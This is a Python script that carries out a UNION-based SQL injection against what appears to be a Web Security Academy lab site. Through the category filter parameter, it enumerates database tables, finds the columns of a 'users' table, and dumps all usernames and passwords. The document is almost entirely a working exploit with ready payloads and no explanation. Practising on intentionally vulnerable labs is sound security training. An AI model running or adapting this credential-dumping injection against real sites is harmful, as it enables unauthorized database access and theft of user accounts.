import requests
import re
from bs4 import BeautifulSoup

site = '0a4800f0042ae00480e9359f00ab00be.web-security-academy.net'

# Function to perform the SQL injection
def try_payload(payload):
    url = f'https://{site}/filter?category={payload}'
    resp = requests.get(url)
    return resp.text

# Step 1: Find number of columns
def find_number_of_columns():
    return 2

# Step 2: Get table names from information_schema
def find_table_names():
    num_columns = find_number_of_columns()
    if num_columns == 0:
        print("No valid columns found.")
        return
    
    # Try to get table names from information_schema.tables
    payload = f"Gifts' UNION SELECT table_name,null from information_schema.tables --"
    print(f"Trying SQL Injection: {payload}")
    
    resp_text = try_payload(payload)
    
    # Search for a table with a name that looks like 'users'
    user_table_match = re.search(r'users', resp_text, re.IGNORECASE)
    
    if user_table_match:
        print("Found user table 'users'.")
    else:
        print("Could not find user table in the response.")
        print("Raw response preview (first 500 characters):")
        print(resp_text[:500])  # Print first 500 characters for preview

# Step 3: Get column names for the user table
def find_column_names_for_user_table():
    user_table = 'users'  # Based on your previous step finding 'users' table
    
    # Query for column names from the 'users' table
    payload = f"Gifts' UNION SELECT column_name,null from information_schema.columns WHERE table_name='{user_table}' --"
    print(f"Trying SQL Injection: {payload}")
    
    resp_text = try_payload(payload)
    
    # Find the username and password columns in the response
    username_col = None
    password_col = None
    
    # Search for potential column names
    if 'username' in resp_text:
        username_col = 'username'
    if 'password' in resp_text:
        password_col = 'password'
    
    if username_col and password_col:
        print(f"Found username column: {username_col}")
        print(f"Found password column: {password_col}")
    else:
        print("Could not find username or password column.")
        print("Raw response preview (first 500 characters):")
        print(resp_text[:500])  # Print first 500 characters for preview

# Step 4: Dump all users and passwords
def dump_user_data():
    # Assuming we found the columns and table already
    username_col = 'username'
    password_col = 'password'
    user_table = 'users'
    
    payload = f"Gifts' UNION SELECT {username_col},{password_col} from {user_table} --"
    print(f"Trying SQL Injection: {payload}")
    
    resp_text = try_payload(payload)
    
    # Print the full response to see the dumped user data
    print("Dumped user data:")
    print(resp_text)

# Test the functions
find_table_names()
find_column_names_for_user_table()
dump_user_data()
